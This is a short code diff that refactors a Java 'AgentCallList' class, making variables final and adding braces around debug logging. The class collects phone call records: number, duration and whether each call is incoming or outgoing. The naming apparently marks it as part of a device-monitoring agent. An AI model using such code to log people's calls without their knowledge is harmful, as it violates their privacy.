@@ -48,13 +48,14 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 	Call callInAction;
 
 	public int notification(Call call) {
-		String name = "";
-		boolean missed = false;
+		final String name = "";
+		final boolean missed = false;
 		final String nametype = "u";
 		final String note = "no notes";
 
-		
-		if(Cfg.DEBUG) Check.log( TAG + " (notification): " + call);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notification): " + call);
+		}
 		if (call.isOngoing()) {
 			// Arrivano due call, in uscita, una con il number, l'altra senza.
 			if (call.getNumber().length() > 0) {
@@ -63,15 +64,17 @@ public class AgentCallList extends AgentBase implements Observer<Call> {
 			return 0;
 		}
 
-		if(Cfg.DEBUG) Check.asserts(callInAction != null, "null callInAction");
-		
-		boolean outgoing = !callInAction.isIncoming();
-		int duration = call.getDuration(callInAction);
+		if (Cfg.DEBUG) {
+			Check.asserts(callInAction != null, "null callInAction");
+		}
+
+		final boolean outgoing = !callInAction.isIncoming();
+		final int duration = call.getDuration(callInAction);
 		final int LOG_CALLIST_VERSION = 0;
 
 		int len = 28; // 0x1C;
 
-		String number = callInAction.getNumber();
+		final String number = callInAction.getNumber();
 		len += wsize(number);
 		len += wsize(name);
 		len += wsize(note);
